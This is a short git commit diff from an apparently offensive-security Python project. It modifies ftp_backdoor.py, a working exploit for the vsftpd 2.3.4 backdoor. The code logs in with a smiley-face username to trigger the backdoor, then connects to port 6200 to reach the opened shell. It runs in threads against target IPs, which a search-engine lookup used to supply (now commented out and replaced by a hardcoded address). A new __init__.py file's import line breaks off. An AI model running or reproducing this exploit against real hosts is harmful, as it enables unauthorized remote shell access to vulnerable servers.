d4e7075ce06df328b3df21fe827e7beffb5dd71e
owefsad <1528360120@qq.com>
2019-04-04 10:01:34 +0800

    modify: 增加spider元类, 考虑封装osint相关的基础方法

---
+++ devops/ftp/__init__.py
@@ -0,0 +1,8 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Date    : 2019-04-04 09:33:02
+# @Author  : owefsad (1528360120@qq.com)
+# @Link    : http://blog.51cto.com/executer
+# @Version : $Id$
+
+from burp_ftp import 
--- devops/ftp/ftp_backdoor.py
+++ devops/ftp/ftp_backdoor.py
@@ -5,17 +5,29 @@
 # @Link    : http://blog.51cto.com/executer
 # @Version : $Id$
 
-from spider import get_sd
+#from spider import get_sd
 from ftplib import FTP
+from time import sleep
 import threading
 
-def connect_backdoor()
+def connect_backdoor(ip, port=6200):
+	import socket
+	s=socket.socket()
+	try:
+		s.connect((ip, port))
+		print(s.recv(1024))
+	except Exception as e:
+		raise
+	else:
+		pass
+	finally:
+		pass
 
 def load_backdoor(ip, port):
 	try:
 		ftp = FTP(ip)
 		ftp.port = port
-		tp.login(user=k"ftp:)", passwd="pass")
+		ftp.login(user="ftp:)", passwd="pass")
 	except Exception as e:
 		raise
 	else:
@@ -25,9 +37,15 @@ def load_backdoor(ip, port):
 
 
 def main():
-	ress=get_sd("vsftpd 2.3.4")
+	theck_ts = []
+	#ress=get_sd("vsftpd 2.3.4")
+	ress=[("172.16.88.170", 21)]
 	for res in ress:
-		load_backdoor(ip=res[0], port=res[1])
+		ts=threading.Thread(target=load_backdoor, args=(res[0], res[1]))
+		tc=threading.Thread(target=connect_backdoor, args=(res[0],))
+		ts.start()
+		sleep(1)
+		tc.start()
 
 if __name__ == '__main__':
 	main()
